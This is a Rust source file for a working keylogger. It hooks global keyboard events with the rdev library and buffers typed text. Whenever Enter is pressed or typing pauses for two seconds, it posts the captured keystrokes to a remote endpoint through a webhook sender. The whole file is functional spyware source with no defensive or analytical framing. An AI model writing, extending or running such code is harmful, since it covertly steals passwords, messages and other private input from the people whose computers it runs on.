pub mod webhook;

use std::{
    sync::{Arc, Mutex},
    thread,
    time::{Duration, SystemTime},
};

use rdev::{Event, EventType, listen};

use webhook::WebhookSender;

const INTERVAL: Duration = Duration::from_secs(2);

const BACKSPACE: &str = "\x08";
const CONTROL: &str = "\x1B";
const DELETE: &str = "\u{7f}";

const CARRIAGE_RETURN: &str = "\r";

struct KeyState {
    keys: String,

    last_key_pressed: Option<SystemTime>,
}

pub struct KeyLogger {
    sender: Arc<WebhookSender>,

    state: Arc<Mutex<KeyState>>,
}

impl KeyLogger {
    pub fn new() -> Self {
        Self {
            sender: Arc::new(WebhookSender::new()),

            state: Arc::new(Mutex::new(KeyState {
                keys: String::new(),
                last_key_pressed: None::<SystemTime>,
            })),
        }
    }

    pub fn start(self) {
        {
            let state = Arc::clone(&self.state);
            let sender = Arc::clone(&self.sender);

            thread::spawn(move || {
                loop {
                    thread::sleep(INTERVAL);

                    let mut state = match state.lock() {
                        Ok(state) => state,
                        Err(_) => continue,
                    };

                    let keys = &state.keys;
                    let last_pressed = &state.last_key_pressed;

                    if keys.is_empty() {
                        continue;
                    }

                    if let Some(time) = last_pressed {
                        if matches!(time.elapsed(), Ok(elapsed) if elapsed < INTERVAL) {
                            continue;
                        };

                        sender.post(&state.keys);

                        state.keys.clear();
                        state.last_key_pressed = None::<SystemTime>;
                    } else {
                        continue;
                    };
                }
            });
        }

        match listen(move |event: Event| match event.event_type {
            EventType::KeyPress(_) => {
                if let Some(key) = event.name {
                    if key == DELETE || key == BACKSPACE || key == CONTROL {
                        return;
                    }

                    if key == CARRIAGE_RETURN {
                        self.process_keys();
                        return;
                    }

                    if let Ok(mut state) = self.state.lock() {
                        state.last_key_pressed = Some(event.time);
                        state.keys.push_str(&key);
                    }
                }
            }
            _ => (),
        }) {
            Err(error) => eprintln!("{:?}", error),
            _ => (),
        }
    }

    fn process_keys(&self) {
        let mut state = match self.state.lock() {
            Ok(state) => state,
            _ => return,
        };

        self.sender.post(&state.keys);

        state.keys.clear();
        state.last_key_pressed = None::<SystemTime>;
    }
}
